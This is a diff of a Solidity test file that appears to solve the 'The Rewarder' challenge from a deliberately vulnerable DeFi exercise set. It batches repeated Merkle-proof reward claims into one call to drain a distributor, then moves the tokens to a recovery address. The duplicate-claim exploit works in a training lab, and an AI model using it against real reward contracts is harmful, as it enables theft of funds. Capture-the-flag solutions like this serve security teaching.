@@ -170,32 +170,12 @@ contract TheRewarderChallenge is Test {
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         uint256 batchNumber = distributor.getNextBatchNumber(address(dvt));
 
-        Claim[] memory claims = new Claim[](dvtNumber + 1);
-        Claim[] memory wethClaims = new Claim[](wethNumber + 1);
+        Claim[] memory claims = new Claim[](dvtNumber + wethNumber);
 
         // console.log(dvtBal); // before claim
 
-        for (uint256 i = 0; i < dvtNumber; i++) {
+        for (uint256 i = 0; i < wethNumber; i++) {
             claims[i] = Claim({
-                batchNumber: 0,
-                amount: playerDvtAmount,
-                tokenIndex: 0, // DVT
-                proof: merkle.getProof(dvtLeaves, playerIndex)
-            });
-           
-        }
-
-        claims[dvtNumber] = Claim({
-            batchNumber: 0,
-            amount: playerWethAmount,
-            tokenIndex: 1, // WETH
-            proof: merkle.getProof(wethLeaves, playerIndex)
-        });
-
-        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
-
-         for (uint256 i = 0; i < wethNumber; i++) {
-            wethClaims[i] = Claim({
                 batchNumber: 0,
                 amount: playerWethAmount,
                 tokenIndex: 1,
@@ -203,14 +183,17 @@ contract TheRewarderChallenge is Test {
             });
         }
 
-        wethClaims[wethNumber] = Claim({
-            batchNumber: 0,
-            amount: playerDvtAmount,
-            tokenIndex: 0,
-            proof: merkle.getProof(dvtLeaves, playerIndex)
-        });
+        for (uint256 i = 0; i < dvtNumber; i++) {
+            claims[wethNumber + i] = Claim({
+                batchNumber: 0,
+                amount: playerDvtAmount,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, playerIndex)
+            });
+        }
 
-        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 
         // Send everything to recovery
         dvt.transfer(recovery, dvt.balanceOf(player));
